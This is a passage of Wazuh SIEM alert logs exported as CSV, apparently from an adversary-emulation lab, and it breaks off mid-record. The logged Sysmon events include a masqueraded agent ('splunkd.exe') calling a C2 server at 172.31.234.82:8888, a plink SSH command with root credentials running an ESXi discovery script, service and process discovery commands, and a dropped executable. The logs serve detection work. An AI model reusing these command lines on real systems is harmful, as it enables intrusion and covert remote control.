wazuh-alerts-4.x-2024.12.10,E_RRspMBtNh2X6vnUuCV,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-12-10 17:52:18.651
ProcessGuid: {15959494-7fd2-6758-0703-000000000300}
ProcessId: 10088
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: C:\WINDOWS\system32\cmd.exe  /S /D /c"" echo """" ""
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {15959494-7fd1-6758-0503-000000000300}
ParentProcessId: 9892
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C echo """" | ""PathToAtomicsFolder\..\ExternalPayloads\plink.exe"" ""atomic.local"" -ssh  -l ""root"" -pw ""pass"" -m ""2ebcb8_esx_darkside_discovery.txt""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T17:52:18.6542302Z,9426,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,1,FALSE,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032,windows_eventchannel,log,"Dec 10, 2024 @ 17:52:19.420",EventChannel,1733853139,"Dec 10, 2024 @ 17:52:19.420", , , , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-7fd2-6758-0703-000000000300},10088,52:18.7,"SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.19041.4355 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , , , , , , , , , ,{15959494-7fd1-6758-0503-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"cmd.exe /C echo \""\"" | \""PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe\"" \""atomic.local\"" -ssh  -l \""root\"" -pw \""pass\"" -m \""2ebcb8_esx_darkside_discovery.txt\""",0xeacdd,9892,C:\\Users\\mari\\,C:\\Windows\\System32\\cmd.exe,"C:\\WINDOWS\\system32\\cmd.exe  /S /D /c\"" echo \""\"" \""",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,FvRRspMBtNh2X6vnUuCV,1,1,192.168.117.129,agent1,4,Maryam,128,02000000C0A87502000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000,wpad,1014,0x4000000010000000,{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D},3,System,0,"""Name resolution for the name wpad timed out after none of the configured DNS servers responded.""",0,2024-12-10T17:54:04.076605600Z,3393,1448,DESKTOP-B37GATP,1014,1556,WARNING,Microsoft-Windows-DNS-Client,1,FALSE,5,Name resolution for the name wpad timed out,"[""windows"",""windows_system""]",61109,windows_eventchannel,log,"Dec 10, 2024 @ 17:54:04.878",EventChannel,1733853244,"Dec 10, 2024 @ 17:54:04.878", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,HPRRspMBtNh2X6vnUuCV,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 17:54:16.307
ProcessGuid: {15959494-8041-6758-3003-000000000300}
ProcessId: 9972
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_oqkogwrh.qkt.ps1
CreationUtcTime: 2024-12-10 17:54:16.307
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:54:16.3121319Z,9592,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,13,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 17:54:16.669",EventChannel,1733853256,"Dec 10, 2024 @ 17:54:16.669", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-8041-6758-3003-000000000300},9972,54:16.3, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_oqkogwrh.qkt.ps1,54:16.3, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,HfRRspMBtNh2X6vnUuCV,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 17:55:06.992
ProcessGuid: {15959494-807a-6758-3e03-000000000300}
ProcessId: 6456
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_zygvkeq4.ouk.ps1
CreationUtcTime: 2024-12-10 17:55:06.976
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:55:06.9928823Z,9611,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,14,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 17:55:07.446",EventChannel,1733853307,"Dec 10, 2024 @ 17:55:07.446", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-807a-6758-3e03-000000000300},6456,55:07.0, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_zygvkeq4.ouk.ps1,55:07.0, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,KfRRspMBtNh2X6vnUuCV,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-12-10 17:58:03.336
ProcessGuid: {15959494-812b-6758-8d03-000000000300}
ProcessId: 8788
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C tasklist.exe && sc query && sc query state= all
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {15959494-7c97-6758-b201-000000000300}
ParentProcessId: 9140
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T17:58:03.3380013Z,9832,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,5,FALSE,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052,windows_eventchannel,log,"Dec 10, 2024 @ 17:58:04.106",EventChannel,1733853484,"Dec 10, 2024 @ 17:58:04.106", , , , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-812b-6758-8d03-000000000300},8788,58:03.3,"SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.19041.4355 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , , , , , , , , , ,{15959494-7c97-6758-b201-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0xeacdd,9140,C:\\Users\\mari\\,C:\\Users\\Public\\splunkd.exe,cmd.exe /C tasklist.exe &amp;&amp; sc query &amp;&amp; sc query state= all,Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,LfRRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 17:58:05.443
ProcessGuid: {15959494-812d-6758-9103-000000000300}
ProcessId: 7740
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_k2dnkvsq.uea.ps1
CreationUtcTime: 2024-12-10 17:58:05.443
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:58:05.4515908Z,9850,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,19,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 17:58:06.241",EventChannel,1733853486,"Dec 10, 2024 @ 17:58:06.241", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-812d-6758-9103-000000000300},7740,58:05.4, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_k2dnkvsq.uea.ps1,58:05.4, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,MfRRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,4624,0x8020000000000000,{54849625-5478-4994-a5ba-3e3b0328c30d},0,Security,0,"""An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		DESKTOP-QGB4EQH$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x2b4
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.""",2,2024-12-10T17:59:14.4265482Z,1050,768,DESKTOP-QGB4EQH,12544,716,AUDIT_SUCCESS,Microsoft-Windows-Security-Auditing,4,FALSE,3,Windows logon success.,"[""windows"",""windows_security"",""authentication_success""]",60106,windows_eventchannel,log,"Dec 10, 2024 @ 17:59:15.225",EventChannel,1733853555,"Dec 10, 2024 @ 17:59:15.225", , , ,"[""IV_32.2""]","[""7.1"",""7.2""]", , , , , , , , , ,0x2b4, , , , , , ,"[""Valid Accounts""]","[""T1078""]","[""Defense Evasion"",""Persistence"",""Privilege Escalation"",""Initial Access""]", , , , , , ,"[""10.2.5""]","[""164.312.b""]","[""CC6.8"",""CC7.2"",""CC7.3""]","[""AC.7"",""AU.14""]", , ,{00000000-0000-0000-0000-000000000000}, , , , , , , , , ,0x3e7,WORKGROUP,0x0,%%1833,Negotiate,0x3e7,Advapi,SYSTEM,0,%%1842,S-1-5-18,C:\\Windows\\System32\\services.exe,NT AUTHORITY,S-1-5-18,%%1843,5,DESKTOP-QGB4EQH$, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,NvRRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1543.003,technique_name=Windows Service
UtcTime: 2024-12-10 17:59:55.787
ProcessGuid: {15959494-819b-6758-c203-000000000300}
ProcessId: 7872
Image: C:\Windows\System32\sc.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Service Control Manager Configuration Tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: sc.exe
CommandLine: sc  query 
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=B4979A9F970029889713D756C3F123643DDE73DA,MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD
ParentProcessGuid: {15959494-8198-6758-bf03-000000000300}
ParentProcessId: 4924
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C tasklist.exe && sc query && sc query state= all
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T17:59:55.7894311Z,9985,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,7,FALSE,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032,windows_eventchannel,log,"Dec 10, 2024 @ 17:59:55.638",EventChannel,1733853595,"Dec 10, 2024 @ 17:59:55.638", , , , , ,sc.exe,C:\\Windows\\System32\\sc.exe,Microsoft® Windows® Operating System, , ,Service Control Manager Configuration Tool, , ,{15959494-819b-6758-c203-000000000300},7872,59:55.8,"SHA1=B4979A9F970029889713D756C3F123643DDE73DA,MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD","technique_id=T1543.003,technique_name=Windows Service",Microsoft Corporation,10.0.19041.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , , , , , , , , , ,{15959494-8198-6758-bf03-000000000300},{15959494-7b75-6758-ddac-0e0000000000},cmd.exe /C tasklist.exe &amp;&amp; sc query &amp;&amp; sc query state= all,0xeacdd,4924,C:\\Users\\mari\\,C:\\Windows\\System32\\cmd.exe,sc  query,Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,OPRRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:00:56.151
ProcessGuid: {15959494-81d8-6758-c403-000000000300}
ProcessId: 1152
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_hdin04uy.wqm.ps1
CreationUtcTime: 2024-12-10 18:00:56.151
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:00:56.1644383Z,10000,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,22,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:00:57.137",EventChannel,1733853657,"Dec 10, 2024 @ 18:00:57.137", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-81d8-6758-c403-000000000300},1152,00:56.2, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_hdin04uy.wqm.ps1,00:56.2, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,OvRRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:01:55.216
ProcessGuid: {15959494-8213-6758-de03-000000000300}
ProcessId: 9728
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_nt2jid2h.x5u.ps1
CreationUtcTime: 2024-12-10 18:01:55.216
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:01:55.2327710Z,10081,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,24,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:01:56.024",EventChannel,1733853716,"Dec 10, 2024 @ 18:01:56.024", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-8213-6758-de03-000000000300},9728,01:55.2, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_nt2jid2h.x5u.ps1,01:55.2, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,PfRRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-12-10 18:02:02.403
ProcessGuid: {15959494-821a-6758-ec03-000000000300}
ProcessId: 9964
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net.exe  start 
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
ParentProcessGuid: {15959494-8219-6758-eb03-000000000300}
ParentProcessId: 6364
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C net.exe start >> %temp%\service-list.txt
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T18:02:02.4074493Z,10117,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,1,FALSE,3,A C:\\Windows\\System32\\net.exe binary was started by a Windows cmd shell,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92036,windows_eventchannel,log,"Dec 10, 2024 @ 18:02:03.021",EventChannel,1733853723,"Dec 10, 2024 @ 18:02:03.021", , , , , ,net.exe,C:\\Windows\\System32\\net.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-821a-6758-ec03-000000000300},9964,02:02.4,"SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.19041.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Windows Command Shell"",""DLL Search Order Hijacking""]","[""T1059.003"",""T1574.001""]","[""Execution"",""Persistence"",""Privilege Escalation"",""Defense Evasion""]", , , , , , , , , , , ,{15959494-8219-6758-eb03-000000000300},{15959494-7b75-6758-ddac-0e0000000000},cmd.exe /C net.exe start &gt;&gt; %temp%\\service-list.txt,0xeacdd,6364,C:\\Users\\mari\\,C:\\Windows\\System32\\cmd.exe,net.exe  start,Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,QfRRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: -
UtcTime: 2024-12-10 18:02:06.597
ProcessGuid: {15959494-821a-6758-ee03-000000000300}
ProcessId: 9460
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\a.exe
CreationUtcTime: 2024-12-10 18:02:06.597
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:02:06.6274470Z,10157,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,26,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:02:07.504",EventChannel,1733853727,"Dec 10, 2024 @ 18:02:07.504", , , , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-821a-6758-ee03-000000000300},9460,02:06.6, , , , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\a.exe,02:06.6, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,QvRRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-12-10 18:02:54.206
ProcessGuid: {15959494-824e-6758-fe03-000000000300}
ProcessId: 6800
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C C:\Windows\System32\Curl.exe -s -A ""HttpBrowser/1.0"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""Wget/1.9+cvs-stable (Red Hat modified)"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""Opera/8.81 (Windows NT 6.0; U; en)"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""*<|>*"" -m3 www.google.com >nul 2>&1
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {15959494-7c97-6758-b201-000000000300}
ParentProcessId: 9140
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
